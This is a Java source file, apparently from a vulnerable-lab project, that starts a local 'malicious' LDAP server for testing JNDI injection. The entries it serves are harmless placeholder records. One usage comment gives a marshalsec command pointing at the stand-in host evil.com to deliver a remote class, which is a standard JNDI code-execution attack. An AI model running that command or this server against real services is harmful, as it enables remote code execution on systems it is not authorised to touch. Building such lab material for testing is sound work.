package com.jndiserver;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.ldif.LDIFAddRecord;
import com.unboundid.ldif.LDIFReader;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.IOException;
import java.net.InetAddress;

/**
 * 恶意 LDAP Server - 用于 JNDI 注入漏洞验证
 *
 * 警告：此代码仅用于安全测试和教育目的
 *
 * 使用方法：
 * 1. 需要 UnboundID LDAP SDK 依赖
 * 2. 编译运行此服务器
 * 3. 测试: http://localhost:8080/jndi/ldap/vuln?url=ldap://localhost:1389/Exploit
 *
 * 或者使用 marshalsec 工具：
 * java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://evil.com/#Exploit" 1389
 *
 * @author VulnLab
 */
public class EvilLDAPServer {

    private static final int LDAP_PORT = 1389;
    private static final String BASE_DN = "dc=evil,dc=com";

    public static void main(String[] args) {
        try {
            // 创建内存 LDAP 服务器配置
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(BASE_DN);
            config.setListenerConfigs(
                new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    LDAP_PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
                )
            );

            // 配置服务器选项
            config.addAdditionalBindCredentials("cn=Directory Manager", "password");

            // 创建并启动 LDAP 服务器
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

            // 添加恶意条目
            addMaliciousEntries(ds);

            ds.startListening();

            System.out.println("========================================");
            System.out.println("[*] 恶意 LDAP Server 已启动");
            System.out.println("[*] 监听端口: " + LDAP_PORT);
            System.out.println("[*] Base DN: " + BASE_DN);
            System.out.println("[*] 测试 URL: ldap://localhost:" + LDAP_PORT + "/Exploit");
            System.out.println("========================================");
            System.out.println("[!] 等待 JNDI 连接...");

            // 保持服务运行
            while (true) {
                Thread.sleep(1000);
            }
        } catch (Exception e) {
            System.err.println("[!] LDAP Server 启动失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * 添加恶意 LDAP 条目
     */
    private static void addMaliciousEntries(InMemoryDirectoryServer ds) {
        try {
            // 添加根条目
            String rootEntry = "dn: " + BASE_DN + "\n" +
                "objectClass: top\n" +
                "objectClass: domain\n" +
                "dc: evil\n";
            ds.add(new LDIFAddRecord(rootEntry.split("\n")));

            // 添加 Exploit 条目
            String exploitEntry = "dn: cn=Exploit," + BASE_DN + "\n" +
                "objectClass: top\n" +
                "objectClass: person\n" +
                "cn: Exploit\n" +
                "sn: Exploit\n" +
                "description: JNDI LDAP Injection Test Entry\n";
            ds.add(new LDIFAddRecord(exploitEntry.split("\n")));

            System.out.println("[*] 已添加恶意 LDAP 条目");
        } catch (LDAPException e) {
            System.err.println("[!] 添加 LDAP 条目失败: " + e.getMessage());
        }
    }
}
